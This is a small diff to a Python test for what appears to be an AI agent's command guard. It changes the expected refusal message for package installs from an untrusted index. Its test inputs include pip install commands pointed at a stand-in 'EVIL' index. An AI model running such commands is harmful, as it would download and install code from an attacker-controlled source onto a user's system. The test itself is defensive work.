@@ -62,7 +62,7 @@ with tempfile.TemporaryDirectory() as d:
 
     # 2. an index chosen in the command that the person does not use: the agent decides (card + ack)
     r = cmd(f"pip install -i {EVIL} requests")
-    assert r.action == "refuse" and "ack id" in r.reason, r
+    assert r.action == "refuse" and "run the same install again, unchanged, within 30 minutes" in r.reason, r
     r = cmd(f"PIP_INDEX_URL={EVIL} pip install requests")
     assert r.action == "refuse", r
     # a name not on PyPI from an index the agent chose is not "internal"
